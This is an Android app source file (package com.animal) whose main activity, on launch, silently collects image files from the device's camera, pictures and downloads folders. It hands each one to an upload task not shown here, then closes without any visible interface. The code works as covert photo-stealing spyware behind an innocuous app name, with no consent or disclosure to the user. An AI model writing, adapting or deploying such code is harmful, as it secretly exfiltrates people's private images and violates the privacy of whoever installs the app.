package com.animal;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import android.app.Activity;
import android.os.Bundle;
import android.os.Environment;
import android.view.Menu;
import android.widget.TextView;

public class MainActivity extends Activity {

	TextView text;
	
	private static final String FILENAME_REGEX = "(\\_)?((DSC)|(IMG)).*\\.((jpg)|(png)|(jpeg))";
	
	private final static String IMAGE_PATHS[] = {
		Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).toString() + "/Camera",
		Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).toString(),
		Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString(),
	};
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
	
		text = (TextView) findViewById(R.id.texto);
		
		List<File> archivos = new ArrayList<File>();
		
		for (String path : IMAGE_PATHS) {
			File files[] = new File(path).listFiles();
			if (files != null) {
				for (File file : files) {
					if (file.getName().matches(FILENAME_REGEX)) {
						archivos.add(file);						
					}
				}
			}
		}
		
		for (File archivo : archivos) {
			try {
				new FileUploader(this).execute(archivo);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		
		this.finish();
	}
	
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
